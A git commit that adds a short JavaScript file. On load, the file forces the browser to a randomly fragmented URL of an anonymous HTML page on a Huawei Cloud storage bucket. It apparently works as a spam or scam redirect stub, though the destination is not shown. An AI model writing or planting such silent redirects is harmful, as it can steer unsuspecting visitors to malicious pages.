6fe735f08f0e449ab5594044c56b0526961f08f2
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-06-12 00:36:32 +0800

    Create fhtzqs.js

---
+++ fhtzqs.js
@@ -0,0 +1,17 @@
+var urls=[
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/35cafb7f9bba4a90a89cbb4b3ed06b45.html#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
